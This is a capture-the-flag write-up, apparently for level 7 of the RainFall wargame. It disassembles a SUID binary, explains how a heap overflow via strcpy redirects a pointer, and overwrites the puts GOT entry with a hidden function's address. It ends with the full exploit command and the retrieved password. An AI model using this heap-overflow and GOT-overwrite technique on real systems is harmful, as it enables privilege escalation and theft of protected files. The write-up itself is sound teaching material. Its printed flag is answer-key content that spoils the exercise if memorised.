# Level 7 — Writeup: Heap Overflow to GOT Overwrite

## Vulnerability Analysis

By examining the assembly code of the `level7` executable, we identify two key functions: `main` and `m`.

```assembly
(gdb) info function
All defined functions:

Non-debugging symbols:
0x0804836c  _init
0x080483b0  printf
0x080483b0  printf@plt
0x080483c0  fgets
0x080483c0  fgets@plt
0x080483d0  time
0x080483d0  time@plt
0x080483e0  strcpy
0x080483e0  strcpy@plt
0x080483f0  malloc
0x080483f0  malloc@plt
0x08048400  puts
0x08048400  puts@plt
0x08048410  __gmon_start__
0x08048410  __gmon_start__@plt
0x08048420  __libc_start_main
0x08048420  __libc_start_main@plt
0x08048430  fopen
0x08048430  fopen@plt
0x08048440  _start
0x08048470  __do_global_dtors_aux
0x080484d0  frame_dummy
0x080484f4  m
0x08048521  main
0x08048610  __libc_csu_init
0x08048680  __libc_csu_fini
0x08048682  __i686.get_pc_thunk.bx
0x08048690  __do_global_ctors_aux
0x080486bc  _fini
```

```assembly 
(gdb) disass main
Dump of assembler code for function main:
   0x08048521 <+0>:     push   ebp
   0x08048522 <+1>:     mov    ebp,esp
   0x08048524 <+3>:     and    esp,0xfffffff0
   0x08048527 <+6>:     sub    esp,0x20
   0x0804852a <+9>:     mov    DWORD PTR [esp],0x8
   0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:    mov    DWORD PTR [esp+0x1c],eax
   0x0804853a <+25>:    mov    eax,DWORD PTR [esp+0x1c]
   0x0804853e <+29>:    mov    DWORD PTR [eax],0x1
   0x08048544 <+35>:    mov    DWORD PTR [esp],0x8
   0x0804854b <+42>:    call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:    mov    edx,eax
   0x08048552 <+49>:    mov    eax,DWORD PTR [esp+0x1c]
   0x08048556 <+53>:    mov    DWORD PTR [eax+0x4],edx
   0x08048559 <+56>:    mov    DWORD PTR [esp],0x8
   0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:    mov    DWORD PTR [esp+0x18],eax
   0x08048569 <+72>:    mov    eax,DWORD PTR [esp+0x18]
   0x0804856d <+76>:    mov    DWORD PTR [eax],0x2
   0x08048573 <+82>:    mov    DWORD PTR [esp],0x8
   0x0804857a <+89>:    call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:    mov    edx,eax
   0x08048581 <+96>:    mov    eax,DWORD PTR [esp+0x18]
   0x08048585 <+100>:   mov    DWORD PTR [eax+0x4],edx
   0x08048588 <+103>:   mov    eax,DWORD PTR [ebp+0xc]
   0x0804858b <+106>:   add    eax,0x4
   0x0804858e <+109>:   mov    eax,DWORD PTR [eax]
   0x08048590 <+111>:   mov    edx,eax
   0x08048592 <+113>:   mov    eax,DWORD PTR [esp+0x1c]
   0x08048596 <+117>:   mov    eax,DWORD PTR [eax+0x4]
   0x08048599 <+120>:   mov    DWORD PTR [esp+0x4],edx
   0x0804859d <+124>:   mov    DWORD PTR [esp],eax
   0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:   mov    eax,DWORD PTR [ebp+0xc]
   0x080485a8 <+135>:   add    eax,0x8
   0x080485ab <+138>:   mov    eax,DWORD PTR [eax]
   0x080485ad <+140>:   mov    edx,eax
   0x080485af <+142>:   mov    eax,DWORD PTR [esp+0x18]
   0x080485b3 <+146>:   mov    eax,DWORD PTR [eax+0x4]
   0x080485b6 <+149>:   mov    DWORD PTR [esp+0x4],edx
   0x080485ba <+153>:   mov    DWORD PTR [esp],eax
   0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:   mov    edx,0x80486e9
   0x080485c7 <+166>:   mov    eax,0x80486eb
   0x080485cc <+171>:   mov    DWORD PTR [esp+0x4],edx
   0x080485d0 <+175>:   mov    DWORD PTR [esp],eax
   0x080485d3 <+178>:   call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:   mov    DWORD PTR [esp+0x8],eax
   0x080485dc <+187>:   mov    DWORD PTR [esp+0x4],0x44
   0x080485e4 <+195>:   mov    DWORD PTR [esp],0x8049960
   0x080485eb <+202>:   call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:   mov    DWORD PTR [esp],0x8048703
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>
   0x080485fc <+219>:   mov    eax,0x0
   0x08048601 <+224>:   leave  
   0x08048602 <+225>:   ret    
End of assembler dump.
(gdb) disass m
Dump of assembler code for function m:
   0x080484f4 <+0>:     push   ebp
   0x080484f5 <+1>:     mov    ebp,esp
   0x080484f7 <+3>:     sub    esp,0x18
   0x080484fa <+6>:     mov    DWORD PTR [esp],0x0
   0x08048501 <+13>:    call   0x80483d0 <time@plt>
   0x08048506 <+18>:    mov    edx,0x80486e0
   0x0804850b <+23>:    mov    DWORD PTR [esp+0x8],eax
   0x0804850f <+27>:    mov    DWORD PTR [esp+0x4],0x8049960
   0x08048517 <+35>:    mov    DWORD PTR [esp],edx
   0x0804851a <+38>:    call   0x80483b0 <printf@plt>
   0x0804851f <+43>:    leave  
   0x08048520 <+44>:    ret    
End of assembler dump.
```
### 1. The Hidden Function (`m`)

The function `m` at address `0x080484f4` is clearly designed to give us the flag. It prints the contents of a global buffer located at `0x8049960` using `printf`:

```assembly
0x0804850f <+27>:    mov    DWORD PTR [esp+0x4],0x8049960  ; Load buffer address
..
0x0804851a <+38>:    call   0x80483b0 <printf@plt>         ; Print it
```

### 2. The `main` Function Flow

The `main` function does the following:

1. **Heap Allocation:** It calls `malloc` multiple times to set up two data structures (let's call them `obj1` and `obj2`). Each object holds an identifier and a pointer to a string buffer.
2. **First `strcpy` (Vulnerability):** It copies our first argument (`argv[1]`) into `obj1`'s string buffer without any length checks.
```assembly
0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
```

3. **Second `strcpy`:** It copies our second argument (`argv[2]`) into `obj2`'s string buffer.
```assembly
    0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
```
4.  **File Reading:** It opens `/home/user/level8/.pass` and reads it into the global buffer at `0x8049960` (the same one function `m` prints!).
```assembly
   0x080485c2 <+161>:   mov    edx,0x80486e9
   0x080485c7 <+166>:   mov    eax,0x80486eb
   0x080485cc <+171>:   mov    DWORD PTR [esp+0x4],edx
   0x080485d0 <+175>:   mov    DWORD PTR [esp],eax
   0x080485d3 <+178>:   call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:   mov    DWORD PTR [esp+0x8],eax
   0x080485dc <+187>:   mov    DWORD PTR [esp+0x4],0x44
   0x080485e4 <+195>:   mov    DWORD PTR [esp],0x8049960
   0x080485eb <+202>:   call   0x80483c0 <fgets@plt>
```
5.  **The Decoy Exit:** Finally, it calls `puts` to print a decoy string ("~~") and exits.
    
```assembly
    0x080485f7 <+214>:   call   0x8048400 <puts@plt>
```

## The Exploitation Strategy

We need to execute function `m`. Since there is no direct path to call it, we will use a **Global Offset Table (GOT) Overwrite**. If we overwrite the GOT entry for `puts` with the address of `m`, the program will execute `m()` instead of printing the decoy string at the very end.

We can achieve this by combining a Heap Overflow with the two `strcpy` calls:

*   **How Argument 1 Works:** Because `obj1` and `obj2` are adjacent in the heap, overflowing `obj1`'s buffer via the first `strcpy` allows us to overwrite the variables inside `obj2`. Specifically, we can overwrite `obj2`'s destination pointer with our target address (the GOT address of `puts`).
*   **How Argument 2 Works:** When the program executes the second `strcpy` for `argv[2]`, it looks at `obj2`'s destination pointer to know where to write. Because we changed that pointer in Step 1, it writes `argv[2]` directly into the GOT.

### Gathering the Addresses
1.  **Target Address (puts@GOT):** `0x8049928` -> Little Endian: `\x28\x99\x04\x08`
```assembly
(gdb) disass 0x8048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    DWORD PTR ds:0x8049928
   0x08048406 <+6>:     push   0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.
(gdb) x/wx 0x8049928
0x8049928 <puts@got.plt>:       0x08048406
```
2.  **Value to Inject (Function `m`):** `0x080484f4` -> Little Endian: `\xf4\x84\x04\x08`
```assembly
...
0x080484d0  frame_dummy
0x080484f4  m
0x08048521  main
...
```
3.  **Padding Offset:** Through experimentation, the distance from `obj1`'s buffer to `obj2`'s destination pointer is exactly **20 bytes**.

## Execution & Flag Extraction

The payload consists of two arguments passed directly to the binary:
*   `argv[1]`: 20 bytes of padding + `puts@GOT`
*   `argv[2]`: Address of `m`

**CRITICAL NOTE:** This exploit must be run natively in the shell, *not* inside `gdb` or `ltrace`. Debuggers drop SUID privileges, which causes the `fopen` call to fail and triggers a segfault at `fgets` before the GOT overwrite can be executed.

```bash
level7@RainFall:~$ ./level7 $(python2 -c "print 'a'*20+'\x28\x99\x04\x08'") $(python2 -c "print '\xf4\x84\x04\x08'")
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1778407469
```